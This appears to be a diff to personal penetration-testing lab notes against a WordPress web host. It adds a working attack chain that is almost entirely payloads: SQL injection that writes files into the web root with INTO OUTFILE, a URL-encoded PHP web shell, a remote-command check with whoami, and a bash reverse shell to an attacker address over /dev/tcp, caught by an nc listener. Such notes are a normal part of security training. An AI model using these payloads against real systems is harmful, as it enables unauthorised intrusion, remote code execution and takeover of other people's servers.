@@ -258,6 +258,32 @@ with the payload at /var/www/wordpress/wp-content/plugins/evil/evil.php
 another example is if I wanted to access wpforms lite readme.txt. WP Plugins generally put a dash wherever a space is
 http://alvida-eatery.org/wp-content/plugins/wpforms-lite/readme.txt
 
+some examples of mysql payloads that I was able to use
+1)
+attempt to write into outfile for 6 query columns -- verify by navigating to 10.x.x.x/x.php
+
+SOMEPARAMETER=UNION+SELECT+null,null,null,null,null,null+into+outfile+%22/var/www/html/x.php%22+--+//
+
+2)
+tried injecting "<?php system($_GET['cmd']);?>" into one of the fields
+in that field I url encoded every character and got the following payload
+
+SOMEPARAMETER='UNION+SELECT+null,%22%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%47%45%54%5b%27%63%6d%64%27%5d%29%3b%3f%3e%22,null,null,null,null+into+outfile+%22/var/www/html/x4.php%22+--+//
+
+Verified RCE by doing the following http://10.x.x.x/x4.php?cmd=whoami
+
+3)
+to get shell I did the following
+I remembered the PHP uses bourne as a shell so I used the following reverse shell payload
+
+bash -c "bash -i >& /dev/tcp/ATTACKERIP/4444 0>&1"
+
+I threw that into burpsuite and url encoded everything
+opened a listener using nc -lvnp 4444
+Then I used the following request url to get shell
+
+http://10.x.x.x/x4.php?cmd=%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%34%35%2e%32%34%39%2f%34%34%34%34%20%30%3e%26%31%22
+
 
 
 <><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>><><  
